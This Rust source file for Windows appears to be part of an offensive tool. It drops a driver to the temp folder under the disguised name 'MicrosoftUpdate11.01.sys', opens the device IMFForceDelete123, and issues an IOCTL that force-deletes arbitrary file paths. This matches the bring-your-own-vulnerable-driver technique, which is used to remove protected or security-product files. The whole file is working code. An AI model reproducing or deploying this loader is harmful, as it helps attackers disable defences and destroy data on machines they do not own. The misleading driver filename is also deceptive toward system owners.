use anyhow::{Context, Result, bail};
use std::io::Write;
use std::ptr;
use std::path::{PathBuf, Path};
use std::os::windows::ffi::OsStrExt;
use std::ffi::OsStr;

use winapi::um::winnt::*;
use winapi::um::fileapi::{CreateFileW, OPEN_EXISTING};
use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
use winapi::um::ioapiset::DeviceIoControl;
use winapi::um::errhandlingapi::GetLastError;



/// Dropping the driver to disk

pub fn load(dirver_bytes: &[u8]) -> Result<PathBuf> {

        let sys_path = std::env::temp_dir().join("MicrosoftUpdate11.01.sys");
        if !sys_path.exists()
        // The written file has to be out of scope in order to use it
        {
            let mut file = std::fs::File::create(&sys_path).context("[!] Failed to create driver file!")?;
            file.write_all(dirver_bytes).context("[!] Failed to data to file")?;
        }
        println!("[+] Driver written to {}", sys_path.display());
        Ok(sys_path)
}

/// Initializing the driver 

pub fn init() -> Result<HANDLE> {

		let device_name: Vec<u16> = OsStr::new(r"\\.\IMFForceDelete123")
	        .encode_wide()
	        .chain(Some(0))
	        .collect();

		let handle =  unsafe {
			CreateFileW(
	            device_name.as_ptr(),
	            GENERIC_READ | GENERIC_WRITE,
	            0,
	            ptr::null_mut(),
	            OPEN_EXISTING,
	            0,
	            ptr::null_mut()
        	)};
		
		if handle == INVALID_HANDLE_VALUE {
            let err = unsafe {GetLastError()};
			bail!("[!] Failed to initialize the driver. Error code: {} (0x{:X})", err, err);
			}

		Ok(handle)
	}

pub fn ForceDelete(hDriver: HANDLE, path_str: &str) -> Result<()> {
        
        let mut bytes_returned = 0;
        let prefix = r"\??\";
        let full_path = format!("{}{}", prefix, path_str);
            
        let mut wstr_file: Vec<u16> = OsStr::new(&full_path)
                .encode_wide()
                .chain(Some(0))
                .collect();
                            
        let result = unsafe {
                DeviceIoControl(
                    hDriver,
                    0x8016E000,
                    wstr_file.as_ptr() as *mut _, 
                    (wstr_file.len() * std::mem::size_of::<u16>()) as u32,
                    ptr::null_mut(),        
                    0,
                    &mut bytes_returned,
                    ptr::null_mut(),
                )
            };
            
        if result == 0 {
			let error_code = unsafe { GetLastError() };
            println!("[!] DeviceIoControl failed! Error code: 0x{:08X}", error_code);
        }
        else {
            println!(" -> Deleting File : {}", path_str);
            };
    
    Ok(())  
}

pub fn exit(hDriver: HANDLE) -> Result<()> {
		
		let result = unsafe {CloseHandle(hDriver)};
		if result == 0 {
			bail!("[!] Failed to close the driver's handle!!")
		}
		
		println!("[*] Driver Handle closed!");
		
		Ok(())
	}

